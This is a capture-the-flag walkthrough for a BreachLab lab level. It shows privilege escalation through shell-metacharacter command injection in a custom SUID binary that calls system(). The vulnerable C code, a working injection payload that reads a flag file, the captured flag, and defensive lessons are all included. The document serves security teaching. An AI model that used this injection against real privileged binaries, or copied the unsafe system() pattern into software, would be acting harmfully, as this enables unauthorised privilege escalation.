# BreachLab - Phantom Track: Level 7 (Local Authority)

## General Information

- **Platform:** [BreachLab](https://breachlab.org)
- **Track:** Phantom Track (Post-Exploitation & Operational Tradecraft)
- **Level:** Level 7 (Local Authority)
- **Host:** `204.168.229.209`
- **Port:** `2223`
- **Current User:** `phantom7`
- **Compromised User:** `flagkeeper7`
- **Goal:** Identify a non-root SUID utility, exploit a command injection vulnerability in a binary using unsafe `system()` calls, and retrieve the level flag
- **Next User / Flag Code:** `bl_phtm7_937a0b0148951cae`

---

## 1. Scenario & Objectives

Upon connecting via SSH, the MOTD banner and `BRIEFING` detail the mission parameters:

```
MISSION: Local Authority
========================

A custom system utility runs with elevated privileges. It looks
safe. It takes a hostname argument and checks it.

Examine how it processes your input. What if the input is not a
hostname?

FLAG: owned by the user the SUID binary runs as (check `ls -l`
on the binary — it is not root).
```

The objective is to audit custom SUID binaries on the system, locate `/usr/local/bin/system-checker` owned by `flagkeeper7`, analyze the input handling flaw, exploit shell metacharacter command injection via unsafe `system()` ping invocation, and extract `/var/lib/phantom-flags/level7_flag`.

---

## 2. Reconnaissance & Privilege Enumeration

Logging in as `phantom7` and inspecting permissions of the system diagnostic utility:

```bash
phantom7@phantom:~$ ls -l /usr/local/bin/system-checker
-rwsr-x--- 1 flagkeeper7 phantom7 16224 May 28 16:07 /usr/local/bin/system-checker
```

### Forensic Analysis of Ownership and Permissions

- **Target Binary:** `/usr/local/bin/system-checker`
- **File Ownership:** `flagkeeper7:phantom7`
- **Permissions:** `-rwsr-x---` (`4750`). The binary has the SetUID (`s`) bit active.
- **Principle of Least Privilege (Segmented Privileges):** Although not owned by `root`, the binary executes under the security context of `flagkeeper7`, who owns the target level flag.

---

## 3. Vulnerability Mechanism: Unsanitized `system()` Invocation

Executing the tool with legitimate arguments:

```bash
phantom7@phantom:~$ /usr/local/bin/system-checker localhost
[*] Checking host: localhost
PING localhost(localhost (::1)) 56 data bytes
64 bytes from localhost (::1): icmp_seq=1 ttl=64 time=0.026 ms

--- localhost ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.026/0.026/0.026/0.000 ms
[+] Host is reachable.
```

### Deconstruction of the Flaw in C

In C/C++, developers often invoke native system binaries using `system()`:

```c
char cmd[256];
snprintf(cmd, sizeof(cmd), "ping -c 1 %s", argv[1]);
system(cmd);
```

Because `system()` invokes `/bin/sh -c "<command>"`, supplying unvalidated user input containing shell metacharacters (such as `;`, `&&`, `||`, `|`, or `$()`) causes the shell interpreter to split or evaluate injected commands with the process's effective permissions.

---

## 4. Exploitation: Metacharacter Command Injection (`;`)

By appending a command separator (`;`), we break out of the initial `ping` command and append an arbitrary command executed under `flagkeeper7`'s effective identity:

```bash
phantom7@phantom:~$ /usr/local/bin/system-checker "localhost; cat /var/lib/phantom-flags/level7_flag"
[*] Checking host: localhost; cat /var/lib/phantom-flags/level7_flag
PING localhost(localhost (::1)) 56 data bytes
64 bytes from localhost (::1): icmp_seq=1 ttl=64 time=0.034 ms

--- localhost ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.034/0.034/0.034/0.000 ms
bl_phtm7_937a0b0148951cae
[+] Host is reachable.
```

### Execution Flow

1. The dynamic shell constructs: `/bin/sh -c "ping -c 1 localhost; cat /var/lib/phantom-flags/level7_flag"`.
2. The initial ping completes successfully.
3. The `;` forces the shell to execute the second command (`cat /var/lib/phantom-flags/level7_flag`) inheriting the SUID privileges of `flagkeeper7`.
4. The flag is read and returned directly in stdout.

---

## 5. Flag / Credentials Retrieved

| Parameter | Value |
| :--- | :--- |
| **Track** | Phantom Track (Level 7) |
| **Current User** | `phantom7` |
| **Compromised User** | `flagkeeper7` |
| **Vulnerable Binary** | `/usr/local/bin/system-checker` (`-rwsr-x---`) |
| **Vulnerability Type** | Unsanitized Input to `system()` (C Command Injection) |
| **Exploitation Technique** | Metacharacter Command Chaining (`localhost; cat <flag>`) |
| **Discovered Flag** | `bl_phtm7_937a0b0148951cae` |
| **Artifact Path** | `/var/lib/phantom-flags/level7_flag` |

---

## 6. Key Commands & Concepts Reference

- `ls -l /path/to/binary`: Inspect SetUID permissions and ownership.
- `;`, `&&`, `||`, `|`: Shell command chaining metacharacters used to alter control flow.
- `system()` vs `execve()`: `system()` invokes an unhardened subshell parsing metacharacters, while `execve()` treats arguments as literal arrays preventing command injection.

---

## 7. Lessons Learned & Defensive Takeaways

1. **Eliminate `system()` / `popen()` in Privileged Code:** Never use `system()` or `popen()` in binaries running with elevated permissions (SUID/Capabilities). Instead, use the `exec` family (`execve()`, `execv()`, `execl()`) passing arguments as a fixed array of strings where shell expansion and metacharacters are not interpreted.
2. **Horizontal SUID Auditing:** Security audits must not exclusively focus on `root`-owned SUID binaries. Intermediate service accounts frequently hold access to restricted datasets or sensitive application secrets.
3. **Rigorous Input Validation:** Implement strict allowlists (e.g., regex `^[a-zA-Z0-9.-]+$`) if user-supplied input must ever be passed to network diagnostic routines.
